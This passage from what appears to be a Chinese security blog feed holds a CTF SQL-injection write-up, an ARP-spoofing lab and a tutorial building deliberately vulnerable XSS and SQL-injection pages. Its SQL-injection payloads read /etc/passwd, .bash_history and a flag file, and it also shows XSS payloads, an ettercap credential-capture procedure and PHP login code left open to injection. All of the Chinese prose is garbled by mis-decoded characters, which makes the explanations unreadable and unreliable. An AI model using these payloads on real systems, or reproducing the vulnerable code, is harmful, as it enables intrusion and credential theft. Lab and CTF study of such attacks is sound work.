å‡ºäº†æˆ‘ä»¬æƒ³è¦çš„sqlè¯­å¥ï¼Œuser()è¿™ä¸ªsqlå‡½æ•°å°±ä¼šè¢«æ‰§è¡Œï¼Œæ˜¾ç¤ºå½“å‰çš„ç”¨æˆ·</p><p><img src="https://i.loli.net/2020/12/07/DEre87viLhH6Aby.png" alt="image-20201207094017109"></p><p> åŸç†çŸ¥é“äº†ï¼Œä¸‹é¢å°±æ˜¯å…·ä½“çš„åšè¿™ä¸ªé¢˜ç›®</p><p>é¦–å…ˆè¯»å– <strong>/etc/passwd</strong> çœ‹çœ‹æœåŠ¡å™¨ä¸Šæœ‰å“ªäº›ç”¨æˆ·ï¼Œpayloadä¸º: <strong>â€˜,content=(select load_file(â€˜/etc/passwdâ€™)),/*</strong></p><p><img src="https://i.loli.net/2020/12/07/rg5k8mAsKST3hea.png" alt="image-20201207094741282"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æœ‰wwwç”¨æˆ·çš„ï¼Œé‚£ä¹ˆä¹…å­˜åœ¨<strong>.bash_history</strong> è®°å½•ï¼Œç»§ç»­æŸ¥çœ‹</p><pre><code class="hljs awk">title=<span class="hljs-number">1</span>&amp;category=<span class="hljs-string">&#x27;,content=(select( load_file(&#x27;</span><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/.bash_history&#x27;))),/</span>*&amp;content=<span class="hljs-number">11</span></code></pre><p><img src="https://i.loli.net/2020/12/07/7YDFXWbGHcxNqAk.png" alt="image-20201207094934593"></p><p>ä¹Ÿå°±æ˜¯ä»¥ä¸‹å‡ æ¡æŒ‡ä»¤</p><pre><code class="hljs awk">cd  <span class="hljs-regexp">/tmp/</span> unzip html.ziprm -f html.zipcp -r html <span class="hljs-regexp">/var/</span>www/cd  <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>rm -f .DS_Storeservice apache2 start</code></pre><p>å¯ä»¥çœ‹å‡ºæ¥ <code>.Ds_Store</code>æ˜¯å­˜åœ¨/tmp/htmlç›®å½•ä¸‹çš„ï¼Œé‚£å°±çœ‹çœ‹æœ‰ä»€ä¹ˆ</p><p>ç›´æ¥æŸ¥çœ‹è¯¥æ–‡ä»¶ä¼šå‘ç°é•¿åº¦ä¸å¤Ÿï¼Œè€Œä¸”æ˜¾ç¤ºä¸å¯è§å­—ç¬¦</p><p><img src="https://i.loli.net/2020/12/07/Bl5n6KNOTUdGb1Z.png" alt="image-20201207095822022"></p><p>ä½¿ç”¨hex()å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜</p><pre><code class="hljs awk">title=<span class="hljs-number">1</span>&amp;category=<span class="hljs-string">&#x27;,content=(select hex( load_file(&#x27;</span><span class="hljs-regexp">/tmp/</span>html<span class="hljs-regexp">/.DS_Store&#x27;))),/</span>*&amp;content=<span class="hljs-number">11</span></code></pre><p>åœ¨çº¿è§£ç åå¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼Œå­˜åœ¨ä¸€ä¸ª <code>flag_8946e1ff1ee3e40f.php</code></p><p>æŸ¥çœ‹flagï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä» /var/www/html/ä¸­å¤åˆ¶è¿‡æ¥çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦åˆ°é‚£ä¸ªç›®å½•è¯»å–</p><pre><code class="hljs apache"><span class="hljs-attribute">title</span>=<span class="hljs-number">1</span>&amp;category=&#x27;,content=(select hex( load_file(&#x27;/var/www/html/flag_<span class="hljs-number">8946</span>e<span class="hljs-number">1</span>ff<span class="hljs-number">1</span>ee<span class="hljs-number">3</span>e<span class="hljs-number">40</span>f.php&#x27;))),/*&amp;content=<span class="hljs-number">11</span></code></pre><p><img src="https://i.loli.net/2020/12/07/Ce9WJYTFU5HMrOp.png" alt="image-20201207101235024"></p><p>åœ¨çº¿è§£ç å³å¯</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>arp attack</title>
    <link href="/2020/11/27/attack/"/>
    <url>/2020/11/27/attack/</url>
    
    <content type="html"><![CDATA[<h1 id="arpæ”»å‡»"><a href="#arpæ”»å‡»" class="headerlink" title="arpæ”»å‡»"></a>arpæ”»å‡»</h1><p>ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®æ˜¯ä¸€ä¸ªä½äº<a href="https://baike.baidu.com/item/TCP%2FIPåè®®">TCP/IPåè®®</a>æ ˆä¸­çš„ç½‘ç»œå±‚ï¼Œè´Ÿè´£å°†æŸä¸ª<a href="https://baike.baidu.com/item/IPåœ°å€">IPåœ°å€</a>è§£ææˆå¯¹åº”çš„<a href="https://baike.baidu.com/item/MACåœ°å€">MACåœ°å€</a>ã€‚</p><span id="more"></span><p>ARP ç—…æ¯’æ”»å‡»æ˜¯<a href="https://baike.baidu.com/item/å±€åŸŸç½‘/98626">å±€åŸŸç½‘</a>æœ€å¸¸è§çš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚ç”±äºTCP/IPåè®®å­˜åœ¨çš„ä¸€äº›æ¼æ´ç»™ARPç—…æ¯’æœ‰è¿›è¡Œæ¬ºéª—æ”»å‡»çš„æœºä¼šï¼ŒARPåˆ©ç”¨TCP/IPåè®®çš„æ¼æ´è¿›è¡Œæ¬ºéª—æ”»å‡»ï¼Œç°å·²ä¸¥é‡å½±å“åˆ°äººä»¬æ­£å¸¸<a href="https://baike.baidu.com/item/ä¸Šç½‘/217407">ä¸Šç½‘</a>å’Œ<a href="https://baike.baidu.com/item/é€šä¿¡/300982">é€šä¿¡</a>å®‰å…¨ã€‚å½“å±€åŸŸç½‘å†…çš„è®¡ç®—æœºé­åˆ°ARPçš„æ”»å‡»æ—¶ï¼Œå®ƒå°±ä¼šæŒç»­åœ°å‘å±€åŸŸç½‘å†…æ‰€æœ‰çš„è®¡ç®—æœºåŠç½‘ç»œé€šä¿¡è®¾å¤‡å‘é€å¤§é‡çš„ARPæ¬ºéª—æ•°æ®åŒ…ï¼Œå¦‚æœä¸åŠæ—¶å¤„ç†ï¼Œä¾¿ä¼šé€ æˆç½‘ç»œé€šé“é˜»å¡ã€ç½‘ç»œè®¾å¤‡çš„æ‰¿è½½è¿‡é‡ã€ç½‘ç»œçš„é€šè®¯è´¨é‡ä¸ä½³ç­‰æƒ…å†µã€‚</p><h2 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p>ARPæ”»å‡»ä¸»è¦æ˜¯é€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€è¿›è¡Œæ¬ºéª—ã€‚ä½¿ä»¥å¤ªç½‘æ•°æ®åŒ…çš„æºåœ°å€ã€ç›®æ ‡åœ°å€å’ŒARPé€šä¿¡æ•°é‡å‰§å¢å¯¼è‡´ç½‘ç»œä¸­æ–­æˆ–ä¸­é—´äººæ”»å‡»ã€‚ARPæ”»å‡»ä¸»è¦å­˜åœ¨äºå±€åŸŸç½‘ä¸­ã€‚è‹¥å…¶ä¸­ä¸€å°è®¡ç®—æœºæ„ŸæŸ“ARPç—…æ¯’ã€‚å°±ä¼šè¯•å›¾é€šè¿‡ARPæ¬ºéª—æˆªè·å±€åŸŸç½‘å†…å…¶ä»–è®¡ç®—æœºçš„ä¿¡æ¯ï¼Œé€ æˆå±€åŸŸç½‘å†…çš„è®¡ç®—æœºé€šä¿¡æ•…éšœã€‚</p><h2 id="å®éªŒæœºå™¨"><a href="#å®éªŒæœºå™¨" class="headerlink" title="å®éªŒæœºå™¨"></a>å®éªŒæœºå™¨</h2><p>2003è™šæ‹Ÿæœºï¼Œä½œä¸ºftpæœåŠ¡å™¨</p><p>xpè™šæ‹Ÿæœºä½œä¸ºç”¨æˆ·è®¿é—®ftpæœåŠ¡</p><p>kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œè·å–xpç™»å½•æ—¶çš„è´¦å·å¯†ç </p><p>xp:10.1.1.3/24</p><p>2003:10.1.1.1/24</p><p>kali:10.1.1.2/24</p><h2 id="å®éªŒæ‹“æ‰‘å›¾"><a href="#å®éªŒæ‹“æ‰‘å›¾" class="headerlink" title="å®éªŒæ‹“æ‰‘å›¾"></a>å®éªŒæ‹“æ‰‘å›¾</h2><p><img src="https://i.loli.net/2020/11/27/BCE6m9cM5pzrFhL.png" alt="1.png"></p><h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="ä¸€-æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ"><a href="#ä¸€-æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ" class="headerlink" title="ä¸€.æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ"></a>ä¸€.æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ</h3><p>ä¸‰å°ä¸»æœºé€šä¿¡æ­£å¸¸</p><h3 id="äºŒ-2003å¼€å¯ftpæœåŠ¡å™¨"><a href="#äºŒ-2003å¼€å¯ftpæœåŠ¡å™¨" class="headerlink" title="äºŒ.2003å¼€å¯ftpæœåŠ¡å™¨"></a>äºŒ.2003å¼€å¯ftpæœåŠ¡å™¨</h3><p>å¼€å¯ftpæœåŠ¡ï¼Œå¹¶è®¾ç½®ç¦æ­¢åŒ¿åè®¿é—®</p><p>å¹¶åˆ›å»ºxpè®¿é—®æ—¶éœ€è¦çš„ä½¿ç”¨çš„è´¦å·</p><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>aaa<span class="hljs-symbol">password:</span><span class="hljs-number">123.</span><span class="hljs-keyword">com</span></code></pre><p>éªŒè¯æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®çš„</p><h3 id="ä¸‰-kaliæ‰“å¼€æ”»å‡»è½¯ä»¶"><a href="#ä¸‰-kaliæ‰“å¼€æ”»å‡»è½¯ä»¶" class="headerlink" title="ä¸‰.kaliæ‰“å¼€æ”»å‡»è½¯ä»¶"></a>ä¸‰.kaliæ‰“å¼€æ”»å‡»è½¯ä»¶</h3><p>æ‰“å¼€ettercap-&gt;undefined sniffing-&gt;eth0-&gt;Host-&gt;scan host-&gt;add-&gt;arp posioning-&gt;é€‰æ‹©ç¬¬ä¸€é¡¹</p><p>æ‰«æåˆ°ä¸¤å°ç›®æ ‡ä¸»æœºï¼Œå¼€å§‹arpæŠ•æ¯’</p><p><img src="https://i.loli.net/2020/11/27/Xos23uSIPQxkiqT.png" alt="arp-2.png"></p><p>æ­¤æ—¶arpæ”»å‡»å·²ç»å¼€å§‹äº†</p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªä¸åŒçš„IPå¯¹åº”çš„ç¡®å®åŒä¸€macåœ°å€ï¼Œå½“è‡ªå·±çš„ç”µè„‘å‡ºç°è¿™ç§æƒ…å†µæ—¶å°±å¯ä»¥åˆ¤æ–­æ˜¯arpæ”»å‡»äº†</p><h3 id="å››-xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç "><a href="#å››-xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç " class="headerlink" title="å››.xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç "></a>å››.xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç </h3><p>å¼€å§‹ç¬¬å››æ­¥</p><p>xpè®¿é—®ftpå¹¶è¾“å…¥è´¦å·å¯†ç </p><p>kalié‚£è¾¹å·²ç»æŠ“å–åˆ°</p><p><img src="https://i.loli.net/2020/11/27/CuI1ovGWZz9tEUp.png" alt="arp-3.png"></p><h2 id="å®éªŒç»“æŸ"><a href="#å®éªŒç»“æŸ" class="headerlink" title="å®éªŒç»“æŸ"></a>å®éªŒç»“æŸ</h2><p>arpæ”»å‡»çš„å¦å¤–ä¸€ç§å½¢å¼æ˜¯åˆ©ç”¨ARPæ¬ºéª—ï¼Œé€ æˆå±€åŸŸç½‘å†…ä¸»æœºé€šä¿¡çš„å¤±è´¥ï¼Œå°±æ˜¯æ— æ³•è¿æ¥ç½‘ç»œã€‚å®ç°æ–¹æ³•æ¯”è¾ƒç®€å•å°±ä¸å†èµ˜è¿°ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>arp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º</title>
    <link href="/2020/11/15/xss-sql/"/>
    <url>/2020/11/15/xss-sql/</url>
    
    <content type="html"><![CDATA[<h1 id="xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º"><a href="#xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º" class="headerlink" title="xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º"></a>xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º</h1><p>ä»¥ä¸‹ç¯å¢ƒéƒ½æ˜¯åŸºäºPHP studyæ­å»ºçš„ï¼Œç‰ˆæœ¬ä¸º php 5.5.38+Apache</p><span id="more"></span><p>å‚è€ƒäº†dvwaçš„æ¼æ´æºç ä¸æ”»å‡»æ–¹å¼ã€‚</p><h2 id="xssæ¼æ´çš„æ­å»º"><a href="#xssæ¼æ´çš„æ­å»º" class="headerlink" title="xssæ¼æ´çš„æ­å»º"></a>xssæ¼æ´çš„æ­å»º</h2><h3 id="1-ç½‘é¡µæºç "><a href="#1-ç½‘é¡µæºç " class="headerlink" title="1.ç½‘é¡µæºç "></a>1.ç½‘é¡µæºç </h3><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;&lt;title&gt;xss&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;center&gt;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;h6&gt;please input your name!&lt;&#x2F;h6&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;?php  function SafeFilter (&amp;$arr) &#123;   $ra&#x3D;Array(&#39;&#x2F;([\x00-\x08,\x0b-\x0c,\x0e-\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39;   ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39;   ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;,   &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39;   ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;);        if (is_array($arr))   &#123;     foreach ($arr as $key &#x3D;&gt; $value)      &#123;        if (!is_array($value))        &#123;          if (!get_magic_quotes_gpc())  &#x2F;&#x2F;ä¸å¯¹magic_quotes_gpcè½¬ä¹‰è¿‡çš„å­—ç¬¦ä½¿ç”¨addslashes(),é¿å…åŒé‡è½¬ä¹‰ã€‚          &#123;             $value  &#x3D; addslashes($value); &#x2F;&#x2F;ç»™å•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰  åŠ ä¸Šåæ–œçº¿è½¬ä¹‰          &#125;          $value       &#x3D; preg_replace($ra,&#39;&#39;,$value);     &#x2F;&#x2F;åˆ é™¤éæ‰“å°å­—ç¬¦ï¼Œç²—æš´å¼è¿‡æ»¤xsså¯ç–‘å­—ç¬¦ä¸²          $arr[$key]     &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“        &#125;        else        &#123;          SafeFilter($arr[$key]);        &#125;     &#125;   &#125;&#125;&#x2F;&#x2F;phpé˜²æ³¨å…¥å’ŒXSSæ”»å‡»é€šç”¨è¿‡æ»¤$_POST    &amp;&amp; SafeFilter($_POST);if (isset($_POST[&#39;username&#39;]))&#123;$s&#x3D;$_POST[&#39;username&#39;];echo $s;&#125;?&gt;&lt;&#x2F;center&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>ç½‘é¡µæºç ååˆ†ç®€å•ï¼Œå°±æ˜¯ç”¨æˆ·è¾“å…¥æ‰€è¦æŸ¥è¯¢çš„usernameï¼Œä¹‹åå°†å…¶è¾“å…¥çš„å†…å®¹æ‰“å°å‡ºæ¥ã€‚</p><p>èµ·åˆå¹¶æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œç›´æ¥æ‰§è¡Œäº†<code>echo</code>ï¼Œé€ æˆäº†xssæ¼æ´çš„å‡ºç°ã€‚</p><h3 id="2-æ”»å‡»æ•ˆæœ"><a href="#2-æ”»å‡»æ•ˆæœ" class="headerlink" title="2.æ”»å‡»æ•ˆæœ"></a>2.æ”»å‡»æ•ˆæœ</h3><p>åœ¨è¾“å…¥æ ä¸­è¾“å…¥ä»¥ä¸‹</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xsss/)</span>&gt;</span></code></pre><p><img src="https://i.loli.net/2020/11/12/4f6rKtjU8sg7IoT.png" alt="xss.png"></p><p><img src="https://i.loli.net/2020/11/12/EAnVq5yv4ZWJo8z.png" alt="xss1.png"></p><h3 id="3-æ¼æ´ä¿®å¤"><a href="#3-æ¼æ´ä¿®å¤" class="headerlink" title="3.æ¼æ´ä¿®å¤"></a>3.æ¼æ´ä¿®å¤</h3><p>ä¿®å¤æ¼æ´åªéœ€è¦å¯¹ç”¨æˆ·çš„è¾“å…¥å†…å®¹è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤ï¼Œå¹¶å°†ä¸€äº›å¯èƒ½é€ æˆæ”»å‡»çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè®©å…¶ä¸èµ·åˆ°åŸæœ¬çš„ä½œç”¨ã€‚</p><p>è¿‡æ»¤å‡½æ•°å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$arr</span></span>) </span><span class="hljs-function"></span>&#123;   <span class="hljs-variable">$ra</span>=<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>,<span class="hljs-string">&#x27;/script/&#x27;</span>,<span class="hljs-string">&#x27;/javascript/&#x27;</span>,<span class="hljs-string">&#x27;/vbscript/&#x27;</span>,<span class="hljs-string">&#x27;/expression/&#x27;</span>,<span class="hljs-string">&#x27;/applet/&#x27;</span>   ,<span class="hljs-string">&#x27;/meta/&#x27;</span>,<span class="hljs-string">&#x27;/xml/&#x27;</span>,<span class="hljs-string">&#x27;/blink/&#x27;</span>,<span class="hljs-string">&#x27;/link/&#x27;</span>,<span class="hljs-string">&#x27;/style/&#x27;</span>,<span class="hljs-string">&#x27;/embed/&#x27;</span>,<span class="hljs-string">&#x27;/object/&#x27;</span>,<span class="hljs-string">&#x27;/frame/&#x27;</span>,<span class="hljs-string">&#x27;/layer/&#x27;</span>,<span class="hljs-string">&#x27;/title/&#x27;</span>,<span class="hljs-string">&#x27;/bgsound/&#x27;</span>   ,<span class="hljs-string">&#x27;/base/&#x27;</span>,<span class="hljs-string">&#x27;/onload/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>,<span class="hljs-string">&#x27;/onchange/&#x27;</span>,<span class="hljs-string">&#x27;/onsubmit/&#x27;</span>,<span class="hljs-string">&#x27;/onreset/&#x27;</span>,<span class="hljs-string">&#x27;/onselect/&#x27;</span>,<span class="hljs-string">&#x27;/onblur/&#x27;</span>,<span class="hljs-string">&#x27;/onfocus/&#x27;</span>,   <span class="hljs-string">&#x27;/onabort/&#x27;</span>,<span class="hljs-string">&#x27;/onkeydown/&#x27;</span>,<span class="hljs-string">&#x27;/onkeypress/&#x27;</span>,<span class="hljs-string">&#x27;/onkeyup/&#x27;</span>,<span class="hljs-string">&#x27;/onclick/&#x27;</span>,<span class="hljs-string">&#x27;/ondblclick/&#x27;</span>,<span class="hljs-string">&#x27;/onmousedown/&#x27;</span>,<span class="hljs-string">&#x27;/onmousemove/&#x27;</span>   ,<span class="hljs-string">&#x27;/onmouseout/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseover/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseup/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>);        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$arr</span>))   &#123;     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">//å¾ªç¯è¯­å¥ï¼ŒæŒ¨ä¸ªæ£€æµ‹</span>     &#123;        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$value</span>))        &#123;          <span class="hljs-keyword">if</span> (!get_magic_quotes_gpc())           &#123;             <span class="hljs-variable">$value</span>  = addslashes(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//ç»™å•å¼•å·ï¼ˆ&#x27;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰  åŠ ä¸Šåæ–œçº¿è½¬ä¹‰</span>          &#125;          <span class="hljs-variable">$value</span>       = preg_replace(<span class="hljs-variable">$ra</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$value</span>);     <span class="hljs-comment">//åˆ é™¤éæ‰“å°å­—ç¬¦</span>          <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]     = htmlentities(strip_tags(<span class="hljs-variable">$value</span>)); <span class="hljs-comment">//å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“</span>        &#125;        <span class="hljs-keyword">else</span>        &#123;          SafeFilter(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);        &#125;     &#125;   &#125;&#125;</code></pre><p><strong>å„ä¸ªå‡½æ•°åŠŸèƒ½å¦‚ä¸‹ï¼š</strong></p><p><strong>magic_quotes_gpc</strong>å‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰:postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯</p><p>åœ¨magic_quotes_gpc=Onçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æœ‰</p><p>å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ã€‚</p><p><strong>addslasheså‡½æ•°</strong></p><p><img src="https://i.loli.net/2020/11/12/W7m2yOvok3g6ZXA.png" alt="addslashes.png"></p><p><strong>htmlentities()</strong> å‡½æ•°æŠŠå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><h2 id="sqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»"><a href="#sqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»" class="headerlink" title="sqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»"></a>sqlæ³¨å…¥ç¯å¢ƒæ­å»ºä¸æ”»å‡»</h2><p>ç½‘é¡µæºç ï¼Œæœ€å¸¸è§çš„ç™»å½•é¡µé¢ï¼Œå…¶ä¸­æ²¡æœ‰å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œè¿‡æ»¤ï¼Œå°±å°†å…¶å¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢é€ æˆäº†sqlæ³¨å…¥çš„å‡ºç°ã€‚</p><p>login.phpæºç </p><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;&lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;        &lt;title&gt;Sqli&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;body&gt;&lt;div class&#x3D;&quot;limiter&quot;&gt;    &lt;div class&#x3D;&quot;container-login100&quot;&gt;        &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt;            &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;&lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt;Account Login&lt;&#x2F;span&gt;                &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt;                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt;                &lt;&#x2F;div&gt;                &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt;                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt;                &lt;&#x2F;div&gt;                &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt;                    &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt;                        Sign in                    &lt;&#x2F;button&gt;                &lt;&#x2F;div&gt;            &lt;&#x2F;form&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>check.phpæºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span 